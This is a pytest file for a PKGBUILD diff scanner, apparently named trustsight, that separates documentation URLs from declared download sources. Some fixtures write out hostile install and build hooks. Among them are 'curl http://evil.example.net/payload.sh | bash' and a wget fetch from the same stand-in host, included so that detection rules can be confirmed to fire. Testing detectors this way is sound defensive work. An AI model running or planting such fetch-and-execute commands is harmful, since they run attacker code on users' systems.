"""Documentation is not source provenance; executable downloads still scan."""

import pytest

from trustsight.analysis import scan_diff
from trustsight.analysis.pipeline._analyze import scored_source_urls
from trustsight.analysis.structural import _structural_findings
from trustsight.changes import change_delta
from trustsight.differ import (
    extract_source_array_urls,
    extract_urls_from_diff,
    urls_from_pkgbuild_text,
)


def _diff(text, name="PKGBUILD"):
    lines = text.splitlines()
    return (f"--- /dev/null\n+++ b/{name}\n@@ -0,0 +1,{len(lines)} @@\n"
            + "".join("+" + line + "\n" for line in lines))


@pytest.mark.parametrize("documentation", [
    'url="https://docs.example.net/guide"',
    'pkgdesc="See https://docs.example.net/guide"',
    'echo "See https://docs.example.net/guide"',
    'printf "%s\\n" "https://docs.example.net/guide"',
])
def test_documentation_never_contributes_source_provenance(documentation):
    diff = _diff(documentation)
    assert extract_urls_from_diff(diff).added_urls  # security's broad API
    assert extract_urls_from_diff(diff, source_only=True).added_urls == []
    assert scored_source_urls(diff, {}, "tool-bin") == []
    assert change_delta(diff).hosts_gained == frozenset()
    seen = {}
    fact = scan_diff(diff, package_name="tool-bin", seen_urls=seen,
                     observation_count=10)
    assert not {"SOURCE_BUCKET", "NOVELTY", "C011"} & {
        entry.rule_id for entry in fact.score_breakdown
    }
    assert not seen["tool-bin"]


def test_install_documentation_and_fake_sources_do_not_leak_into_provenance():
    diff = (_diff('url="https://upstream.example.org"\n'
                  'source=("https://upstream.example.org/tool.tar.gz")')
            + _diff('post_install() {\n'
                    ' echo "https://docs.example.net/guide"\n'
                    ' source=("https://evil.example.net/fake.tar.gz")\n'
                    '}', "tool.install"))
    assert extract_urls_from_diff(diff, source_only=True).added_urls == [
        "https://upstream.example.org/tool.tar.gz"
    ]
    findings = _structural_findings(
        diff, extract_urls_from_diff(diff), package_name="tool-bin"
    )
    assert "C011" not in {finding["rule_id"] for finding in findings}


def test_declared_third_party_source_still_scores_and_fires_c011():
    diff = _diff('url="https://upstream.example.org"\n'
                 'source_x86_64=("tool::https://evil.example.net/tool.tar.gz")')
    seen = {}
    fact = scan_diff(diff, package_name="tool-bin", seen_urls=seen,
                     observation_count=10)
    assert {"SOURCE_BUCKET", "NOVELTY", "C011"} <= {
        entry.rule_id for entry in fact.score_breakdown
    }
    assert seen["tool-bin"] == {"https://evil.example.net/tool.tar.gz"}


def test_source_reader_ignores_comments_ancillary_variables_and_heredocs():
    text = ('_download="https://release.example.org/tool.tar.gz"\n'
            'source=("https://release.example.org/tool.tar.gz") # https://docs.example.net/guide\n'
            'source_aarch64+=(\n'
            ' "https://release.example.org/arm.tar.gz#tag"\n'
            ' # https://docs.example.net/comment\n'
            ')\n'
            'cat <<EOF\n'
            'source=("https://docs.example.net/fake")\n'
            'EOF\n')
    expected = {"https://release.example.org/tool.tar.gz",
                "https://release.example.org/arm.tar.gz#tag"}
    assert urls_from_pkgbuild_text(text) == expected
    assert extract_source_array_urls(_diff(text)) == expected
    assert set(extract_urls_from_diff(_diff(text), source_only=True).added_urls) == expected


def test_unresolved_source_literals_remain_visible_without_documentation():
    diff = (' source=(\n'
            '- "https://release.example.org/old-$pkgver.tar.gz"\n'
            '+ "https://release.example.org/new-$pkgver.tar.gz"\n'
            ' )\n'
            '+echo "https://docs.example.net/guide"\n')
    changes = extract_urls_from_diff(diff, source_only=True)
    assert changes.added_urls == ["https://release.example.org/new-$pkgver.tar.gz"]
    assert changes.removed_urls == ["https://release.example.org/old-$pkgver.tar.gz"]


def test_declaration_shaped_multiline_prose_is_not_a_source():
    text = ('echo "Documentation example:\n'
            'source=(https://docs.example.net/fake)\n'
            '"\n')
    assert urls_from_pkgbuild_text(text) == set()
    assert extract_urls_from_diff(_diff(text), source_only=True).added_urls == []


def test_source_reassignment_does_not_keep_a_stale_download():
    text = ('source=("https://old.example.net/tool.tar.gz")\n'
            'source=("https://release.example.org/tool.tar.gz")\n')
    assert urls_from_pkgbuild_text(text) == {"https://release.example.org/tool.tar.gz"}


def test_documentation_in_another_hunk_cannot_close_a_partial_source_array():
    diff = ('--- a/PKGBUILD\n+++ b/PKGBUILD\n'
            '@@ -1 +1 @@\n source=(\n'
            '@@ -20 +20 @@\n+echo "https://docs.example.net/guide"\n+echo done)\n')
    assert extract_urls_from_diff(diff, source_only=True).added_urls == []


def test_printing_an_unchanged_source_url_does_not_make_it_new():
    diff = (' source=("https://release.example.org/tool.tar.gz")\n'
            '+echo "https://release.example.org/tool.tar.gz"\n')
    changes = extract_urls_from_diff(diff, source_only=True)
    assert changes.added_urls == changes.removed_urls == []


def test_runtime_download_security_is_not_restricted_to_declared_sources():
    diff = _diff('build() {\n'
                 ' curl http://evil.example.net/payload.sh | bash\n'
                 ' wget https://evil.example.net/tool.AppImage\n'
                 '}')
    assert extract_urls_from_diff(diff, source_only=True).added_urls == []
    fact = scan_diff(diff, package_name="tool-bin")
    assert {"R001", "H003", "C005"} <= {
        entry.rule_id for entry in fact.score_breakdown
    }


def test_install_download_security_survives_source_file_filtering():
    diff = _diff('post_install() {\n'
                 ' curl http://evil.example.net/payload.sh | bash\n'
                 '}', "tool.install")
    assert extract_urls_from_diff(diff, source_only=True).added_urls == []
    fact = scan_diff(diff, package_name="tool-bin")
    assert {"R001", "H003"} <= {entry.rule_id for entry in fact.score_breakdown}
